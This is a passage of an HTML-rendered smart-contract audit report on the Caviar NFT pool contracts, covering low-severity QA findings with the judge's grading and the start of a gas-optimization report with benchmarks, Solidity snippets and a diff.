{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    for (uint256 i = 0; i &lt; tokenIds.length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(tokenWeights[i] &gt;= 1e18);       &lt;------------</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // create the leaf for the merkle proof</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        leafs[i] = keccak256(bytes.concat(keccak256(abi.encode(tokenIds[i], tokenWeights[i]))));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // sum each token weight</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        sum += tokenWeights[i];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">```</span></span></code></pre>\n<h2 id=\"8-in-the-privatepoolmetadatatokenuri-function-consider-using-stringstohexstringaddresstokenid-for-the-name-field\" style=\"position:relative;\"><a href=\"#8-in-the-privatepoolmetadatatokenuri-function-consider-using-stringstohexstringaddresstokenid-for-the-name-field\" aria-label=\"8 in the privatepoolmetadatatokenuri function consider using stringstohexstringaddresstokenid for the name field permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[8] In the <code>PrivatePoolMetadata.tokenURI</code> function consider using <code>Strings.toHexString(address(tokenId)))</code> for the <code>name</code> field.</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">```solidity</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function tokenURI(uint256 tokenId) public view returns (string memory) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // forgefmt: disable-next-item</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes memory metadata = abi.encodePacked(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        &quot;{&quot;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            &#39;&quot;name&quot;: &quot;Private Pool &#39;,Strings.toString(tokenId),&#39;&quot;,&#39;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            &#39;&quot;description&quot;: &quot;Caviar private pool AMM position.&quot;,&#39;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            &#39;&quot;image&quot;: &#39;,&#39;&quot;data:image/svg+xml;base64,&#39;, Base64.encode(svg(tokenId)),&#39;&quot;,&#39;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            &#39;&quot;attributes&quot;: [&#39;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                attributes(tokenId),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            &quot;]&quot;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        &quot;}&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    return string(abi.encodePacked(&quot;data:application/json;base64,&quot;, Base64.encode(metadata)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">```</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/624#issuecomment-1529479271\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p><strong>1. The <code>Factory.create</code> function is susceptible to re-entrancy as it performs a <code>_safeMint</code> before initializing the pool.</strong><br>\nLow</p>\n<p><strong>2. The <code>Factory.create</code> function performs plain transfer of funds instead of calling the <code>deposit</code> function. This way the <code>Deposit</code> event is not emitted.</strong><br>\nRefactor</p>\n<p><strong>3. There is no fee cap on the <code>Factory.setProtocolFeeRate</code> function. A value greater then 10000 can break the fee calculations in private pool. Consider validating that the input is less than 10000.</strong><br>\nLow</p>\n<p><strong>4. <code>Factory.tokenId</code> does not validate the input <code>id</code> parameter. Consider validating that the <code>id</code> exist and the respective pool is created by the factory.</strong><br>\nLow</p>\n<p><strong>5. Once initialization is done the <code>PrivatePool.feeRate</code> variable can never be changed. Consider adding an <code>owner</code> restricted function to update <code>feeRate</code>.</strong><br>\nRefactor</p>\n<p><strong>6. In <code>buy</code> and <code>sell</code> functions consider validating that the <code>length</code> of all input arrays are equal (<code>tokenIds</code> &#x26; <code>tokenWeights</code>).</strong><br>\nRefactor</p>\n<p><strong>7. Consider adding a check in <code>PrivatePool.sumWeightsAndValidateProof</code> function to validate that every element of <code>tokenWeights</code> array is greater than or equal to <code>1e18</code>.</strong><br>\nLow</p>\n<p><strong>8. In the <code>PrivatePoolMetadata.tokenURI</code> function consider using <code>Strings.toHexString(address(tokenId)))</code> for the <code>name</code> field.</strong><br>\nNon-Critical</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/624#issuecomment-1529479872\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>4 low, 3 refactor, and 1 non-critical.</p>\n<p>Also includes 6 lows from downgraded findings (issues <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/396\">396</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/392\">392</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/387\">387</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/382\">382</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/381\">381</a>, and <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/719\">719</a>).</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/624#issuecomment-1529516131\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Awarding best due to consistent high quality.</p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this audit, 6 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/372\">report highlighted below</a> by <strong>JCN</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/946\">hunter_w3b</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/879\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/445\">matrix_0wl</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/293\">ReyAdmirado</a>, and <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/12\">Sathish9098</a>.</em></p>\n<h2 id=\"summary-1\" style=\"position:relative;\"><a href=\"#summary-1\" aria-label=\"summary 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h2>\n<p>A majority of the optimizations were benchmarked via the protocol’s tests, i.e. using the following config: <code>solc version 0.8.19</code>, <code>optimizer on</code>, and <code>200 runs</code>. Optimizations that were not benchmarked are explained via EVM gas costs and opcodes.</p>\n<p>Below are the overall average gas savings for the following tested functions (with all the optimizations applied):\n| Function |    Before   |    After   | Avg Gas Savings |\n| ------ | -------- | -------- | ------- |\n| EthRouter.buy |  199750  |  190464  |  9286 |\n| EthRouter.change |  217295  |  202568  |  14727 |<br>\n| EthRouter.deposit |  29900  |  29393  | 507 |\n| EthRouter.sell |  232102  |  223981  | 8121 |\n| Factory.create |  148801  |  148672 | 129 |\n| PrivatePool.buy |  70884  |  69821  | 1063 |\n| PrivatePool.change |  82138  |  78083  | 4055 |\n| PrivatePool.execute |  18890  |  18550  | 340 |\n| PrivatePool.flashLoan |  83063  |  82915  | 148 |\n| PrivatePool.sell |  81969  |  81284  | 685 |\n| PrivatePool.withdraw |  62023  |  61038  | 985 | </p>\n<p><strong>Total gas saved across all listed functions: 40046</strong></p>\n<p><em>Notes</em>: </p>\n<ul>\n<li>The Gas reportoutput, after all optimizations have been applied, can be found at the end of the report.</li>\n<li>The final diffs for each contract, with all the optimizations applied, can be found <a href=\"https://gist.github.com/0xJCN/b03b5f1f8cabc937c8bbe4d4a46b8d47\">here</a>.</li>\n<li>Some code snippets may be truncated to save space. Code snippets may also be accompanied by <code>@audit</code> tags in comments to aid in explaining the issue.</li>\n</ul>\n<h2 id=\"gas-optimizations-1\" style=\"position:relative;\"><a href=\"#gas-optimizations-1\" aria-label=\"gas optimizations 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h2>\n<table>\n<thead>\n<tr>\n<th>Number</th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[G-01]</td>\n<td align=\"left\">Cache calldata/memory pointers for complex types to avoid offset calculations</td>\n<td align=\"center\">52</td>\n</tr>\n<tr>\n<td>[G-02]</td>\n<td align=\"left\">Use calldata instead of memory for function arguments that do not get mutated</td>\n<td align=\"center\">4</td>\n</tr>\n<tr>\n<td>[G-03]</td>\n<td align=\"left\">State variables can be cached instead of re-reading them from storage</td>\n<td align=\"center\">16</td>\n</tr>\n<tr>\n<td>[G-04]</td>\n<td align=\"left\">Cache state variables outside of loop to avoid reading storage on every iteration</td>\n<td align=\"center\">6</td>\n</tr>\n<tr>\n<td>[G-05]</td>\n<td align=\"left\">Rearrange code to fail early</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[G-06]</td>\n<td align=\"left\"><code>x += y/x -= y</code> costs more gas than <code>x = x + y/x = x - y</code> for state variables</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td>[G-07]</td>\n<td align=\"left\"><code>If</code> statements that use <code>&#x26;&#x26;</code> can be refactored into nested <code>if</code> statements</td>\n<td align=\"center\">9</td>\n</tr>\n<tr>\n<td>[G-08]</td>\n<td align=\"left\">Use assembly for loops</td>\n<td align=\"center\">11</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"g-01-cache-calldatamemory-pointers-for-complex-types-to-avoid-offset-calculations\" style=\"position:relative;\"><a href=\"#g-01-cache-calldatamemory-pointers-for-complex-types-to-avoid-offset-calculations\" aria-label=\"g 01 cache calldatamemory pointers for complex types to avoid offset calculations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] Cache calldata/memory pointers for complex types to avoid offset calculations</h2>\n<p>The function parameters in the following instances are complex types (arrays of structs which contain arrays) and thus will result in more complex offset calculations to retrieve specific data from calldata/memory. We can avoid peforming some of these offset calculations by instantiating calldata/memory pointers.</p>\n<p>Total Instances: <code>52</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L106-L138\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L106-L138</a></p>\n<h3 id=\"cache-calldata-pointers-for-buysi-and-buysitokenids\" style=\"position:relative;\"><a href=\"#cache-calldata-pointers-for-buysi-and-buysitokenids\" aria-label=\"cache calldata pointers for buysi and buysitokenids permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache calldata pointers for <code>buys[i]</code> and <code>buys[i].tokenIds</code></h3>\n<p><em>Gas Savings for <code>EthRouter.buy</code>, obtained via protocol’s tests: Avg 5987 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>187054</td>\n<td>397581</td>\n<td>199750</td>\n<td>7</td>\n</tr>\n<tr>\n<td>After</td>\n<td>182524</td>\n<td>381578</td>\n<td>193763</td>\n<td>7</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">buys</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">isPublicPool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">108</span><span class=\"mtk1\">:                </span><span class=\"mtk3\">// execute the buy against a public pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">109</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Pair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk12\">nftBuy</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">baseTokenAmount</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">110</span><span class=\"mtk1\">:                    </span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">, </span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">baseTokenAmount</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">111</span><span class=\"mtk1\">:                );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">112</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">:                </span><span class=\"mtk3\">// pay the royalties if buyer has opted-in</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">114</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">payRoyalties</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">115</span><span class=\"mtk1\">:                    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">salePrice</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">inputAmount</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">116</span><span class=\"mtk1\">:                    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">117</span><span class=\"mtk1\">:                        </span><span class=\"mtk3\">// get the royalty fee and recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">118</span><span class=\"mtk1\">:                        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyRecipient</span><span class=\"mtk1\">) =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">119</span><span class=\"mtk1\">:                            </span><span class=\"mtk11\">getRoyalty</span><span class=\"mtk1\">(</span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">, </span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">], </span><span class=\"mtk12\">salePrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">120</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">121</span><span class=\"mtk1\">:                        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">122</span><span class=\"mtk1\">:                            </span><span class=\"mtk3\">// transfer the royalty fee to the royalty recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">123</span><span class=\"mtk1\">:                            </span><span class=\"mtk12\">royaltyRecipient</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">124</span><span class=\"mtk1\">:                        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">125</span><span class=\"mtk1\">:                    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">126</span><span class=\"mtk1\">:                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">127</span><span class=\"mtk1\">:            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">128</span><span class=\"mtk1\">:                </span><span class=\"mtk3\">// execute the buy against a private pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">129</span><span class=\"mtk1\">:                </span><span class=\"mtk11\">PrivatePool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk12\">buy</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">baseTokenAmount</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">130</span><span class=\"mtk1\">:                    </span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">, </span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">, </span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proof</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">131</span><span class=\"mtk1\">:                );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">132</span><span class=\"mtk1\">:            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">133</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">134</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">135</span><span class=\"mtk1\">:                </span><span class=\"mtk3\">// transfer the NFT to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">136</span><span class=\"mtk1\">:                </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">137</span><span class=\"mtk1\">:            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">138</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/EthRouter.sol b/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 125001d..1ed1c17 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -104,19 +104,21 @@ contract EthRouter is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // loop through and execute the the buys</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i = 0; i &lt; buys.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            if (buys[i].isPublicPool) 